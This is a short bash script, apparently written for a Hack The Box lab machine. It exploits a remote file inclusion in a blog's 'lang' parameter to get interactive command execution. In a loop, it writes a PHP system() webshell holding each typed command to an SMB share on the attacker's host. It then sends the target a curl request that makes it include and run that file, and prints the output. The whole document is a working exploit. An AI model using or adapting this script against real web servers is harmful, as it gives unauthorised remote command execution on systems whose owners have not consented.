#!/bin/bash

Url='http://10.10.10.151/blog/?lang=10.10.14.34/htb/shell.php'
UserAgent='Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
AcceptHeader='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'

while true; do
    read -p "Enter Your Command: " cmd

    if [ "$cmd" == "exit" ]; then
        exit
    fi

    create_rce() {
        printf '<?php system("%s") ?>' "$cmd" > /srv/smb/shell.php
        cat /srv/smb/shell.php
    }

    create_rce

    Send_Exp() {
        send_rce=$(curl -k -i -s -X GET -H "User-Agent: $UserAgent" -H "Accept: $AcceptHeader" "$Url" -x http://127.0.0.1:8080)
        echo "$send_rce" | awk '/<\/html>/ { p = !p; next } p'
    }

    Send_Exp
done
